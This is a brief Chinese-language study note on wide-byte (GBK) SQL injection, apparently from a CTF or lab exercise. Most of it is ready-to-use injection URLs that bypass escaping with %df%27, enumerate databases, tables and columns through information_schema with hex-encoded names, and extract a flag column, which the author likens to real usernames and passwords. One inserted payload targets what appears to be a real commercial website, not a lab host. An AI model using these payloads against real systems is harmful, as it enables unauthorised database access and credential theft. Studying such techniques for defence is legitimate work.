# 宽字节注入---手注例子

keywords: 宽字符注入  

```r
条件：默认字符集是GBK等宽字节字符集

举例：%df%5c%27  被解释成  縗'
%5c  \
%27  '

%df%27 被解释成 運
--------------------------------------------------------------------------------

之后即可进行sql语句查询（我还不太会）
http://115.28.150.176/sqli/index.php
?id=1%df%27 and 1=2 union select 1,2 --+-      加 and 1=2 据说是为了让只执行后面的

http://115.28.150.176/sqli/index.php
?id=1%df%27 and 1=2 union select 1,database() --+-   确定当前数据库  database() 是一个函数


======================华丽的补充============================================

http://www.backstagecommerce.ca/services.php?id=4 and 1=2  UNION SELECT 1,2,group_concat(schema_name),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19 from information_schema.schemata -- -

这个用来查询所有的数据库
======================补充结束=============================================
http://115.28.150.176/sqli/index.php
?id=1%df%27 and 1=2 union select 1,table_name from information_schema.tables where table_schema=0x73716C6931 --+-
根据数据库把表注出来 0x73716C6931是数据库名的16进制（不知道为什么，LS说因为过滤了 ’ 分号，所以改成了十六进制，而且十六进制也可以执行）
Information_Schema.Tables  这里存放的是数据库的所有表的元数据信息

http://115.28.150.176/sqli/index.php
?id=1%df%27 and 1=2 union select 1,column_name from information_schema.columns where table_name=0x666C6167 --+-
根据表名再把列注出来
Information_Schema.Columns  这个是存放管理列的信息了


http://115.28.150.176/sqli/index.php
?id=1%df%27 and 1=2 union select 1,fl4g from flag  --+-
然后就可以注出flag（现实中应该是用户名，密码）


--------------------------------------------------------------------------------

参考网址：
http://blog.csdn.net/hw_henry2008/article/details/6736017
http://www.myhack58.com/Article/html/3/7/2011/30279.htm
```

2016/5/29  
